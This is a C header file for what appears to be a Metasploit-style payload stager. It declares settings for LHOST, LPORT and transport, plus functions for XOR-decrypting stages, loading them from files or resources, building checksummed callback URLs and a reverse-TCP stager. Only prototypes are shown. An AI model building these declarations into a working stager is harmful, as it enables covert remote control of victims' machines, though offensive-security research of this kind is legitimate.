#pragma once
#pragma comment(lib, "Ws2_32.lib") // Better here than linker settings...

#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h> // Make *sure* windows.h gets included after everyting else ... redefinition hell...
#include <time.h>

#include "Constants.h"
#include "resource.h"


//Print if debugging ... learned that from meterpreter source code, metasploit.
//#ifndef _DEBUG
//#define dprintf(...) do{}while(0); //if debug not defined, it will do nothing.
//#else
#define dprintf(...) wprintf_s(__VA_ARGS__) //if debug enabled, it will printf everything. 
//#endif

// Payload settings struct, this gets populated in many ways "command line, file name, resource"
struct PAYLOAD_SETTINGS {
	wchar_t *TRANSPORT;
	wchar_t *LHOST;
	wchar_t *LPORT;
	wchar_t *USER_AGENT;
	int expiration_timeout;
	int comm_timeout;
};

// Function prototypes goes here
LONGLONG SizeFromName(LPCWSTR szFileName);												// Provide a filename, it returns the filesize in bytes.
DWORD CopyStageToBuffer(LPCWSTR szFileName, unsigned char** buffer);								// Copies file contents to buffer, return buffer size.
int PatchString(unsigned char* buffer, const wchar_t* cOriginal, const int index, const int NoOfBytes);		// Search and replace a string in a given buffer.
bool AnsiToUnicode(const char* ascii, wchar_t* unicode);								// Sorry for the insist on unicode support, I'm from Egypt :)
bool UnicodeToAnsi(char* ascii, const wchar_t* unicode);
DWORD binstrstr (unsigned char * buff1, int lenbuff1, unsigned char * buff2, int lenbuff2);				// Binary search, return offset, or 0 if not found/error...
SOCKET get_socket(wchar_t* IP, wchar_t* iPort);		// get a socket from an IP and PORT
DWORD ResourceToBuffer(WORD wResourceID, LPCTSTR lpType, unsigned char** buffer);
void XORcrypt(unsigned char *buffer, char *key, int size);
void GetKeyFromBuffer(unsigned char* buffer, char* key, int size);
void gen_random(char *s, const int len);
int TextChecksum8(char* text);
void print_header();
void usage();
void BuildURL(char *url, int checksum8);


void StagerRevereTCP(wchar_t* IP, wchar_t* iPort);